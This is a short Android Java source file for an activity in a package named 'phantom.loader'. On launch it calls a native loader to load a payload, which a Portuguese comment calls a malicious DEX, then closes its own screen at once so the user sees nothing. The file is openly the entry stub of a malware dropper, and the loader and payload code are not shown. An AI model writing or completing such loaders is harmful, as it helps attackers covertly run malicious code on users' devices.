package com.phantom.loader;

import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // Chama o código nativo para carregar o DEX malicioso
        NativeLoader.loadPayload(this);
        finish(); // Fecha a tela imediatamente
    }
}
